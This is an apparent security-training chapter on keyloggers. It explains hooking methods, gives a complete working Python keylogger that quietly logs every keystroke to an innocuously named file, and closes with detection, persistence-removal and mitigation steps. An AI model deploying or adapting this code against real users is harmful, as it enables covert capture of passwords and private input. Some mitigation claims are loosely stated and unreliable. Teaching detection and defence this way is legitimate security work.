# Chapter 2.1: The Keylogger - Anatomy of the Silent Witness
**Category:** Endpoint Compromise / Malware Analysis  
**Analyst:** Marliz Intel Security Team

---

## 1. Executive Theory: How Keyloggers Work
A keylogger is an exfiltration tool that captures user input before it is processed by the application. There are three primary ways they hook into a system:

### A. The Userland "Hook" (Easy/Common)
The application calls a Windows API (like `SetWindowsHookEx`) to listen for keyboard events. This is how most Python-based keyloggers work.
*   **Pros:** Easy to write, no admin rights required.
*   **Cons:** Easily detected by Antivirus (AV) and EDR.

### B. The Driver/Kernel Level (God Mode)
The keylogger sits between the hardware keyboard and the Operating System. It replaces or "shims" the keyboard driver.
*   **Pros:** Virtually invisible to Task Manager and standard AV.
*   **Cons:** Requires Admin/System privileges and a signed driver (or exploit).

### C. The Hardware physical (Unstoppable)
A device plugged between the keyboard and the PC.
*   **Pros:** Zero digital footprint on the OS.
*   **Cons:** Requires physical access.

---

## 2. Practical Lab: Building a Proof-of-Concept (POC)
This script uses the `pynput` library to capture keystrokes and save them to a hidden file.

### Prerequisites (for educational use):
```bash
pip install pynput
```

### The "Marliz-Logger" POC:
```python
import pynput.keyboard
import logging

# Define the log path (e.g., hidden in AppData)
log_file = "intel_cache.txt"

def on_press(key):
    try:
        # Log the alphanumeric keys
        logging.info(str(key))
    except Exception as e:
        print(f"Error: {e}")

# Configure the logger
logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s: %(message)s')

# Start the listener
with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()
```

---

## 3. The "Post-Success" Prevention (How to kill it)
Once you have "successfully setup" a keylogger for testing, you must know how to neutralize it.

### Step 1: Process Termination
Keyloggers are often hidden as `svchost.exe` or `RuntimeBroker.exe` in locations they don't belong (like `C:\Users\...\Temp\`).
*   **Command:** `powershell "Stop-Process -Name 'Python'"` (If running your POC).

### Step 2: Breaking Persistence
They usually hide in the Registry to start when Windows boots.
*   **Command:** `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
*   **Cleanup:** Delete any keys that point to scripts or suspicious executables.

### Step 3: Mitigation (The Defeat)
1.  **Identity Shifting:** Use Password Managers. Since you "Copy-Paste" the password from the manager, the keylogger only sees one `Ctrl+V` instead of your actual 20-character password.
2.  **Anti-Keylogging API:** Modern browsers (like Edge/Chrome) often use "Sandboxed" processes for bank logins, making it harder for Userland hooks to see what's happening inside the window.
3.  **Endpoint Isolation:** Block outbound traffic on ports you aren't using. If a keylogger can't "Phone Home," it is useless.

---

## 4. Portfolio Conclusion
When presenting this in your portfolio/CV:
*   **Highlight:** "Developed a Python-based keystroke capture POC to study Hooking API vulnerabilities."
*   **Highlight:** "Authored a forensic response guide for detecting and eradicating persistence in Windows-based endpoint attacks."

**Disclaimer:** This material is for research and authorized security testing only.
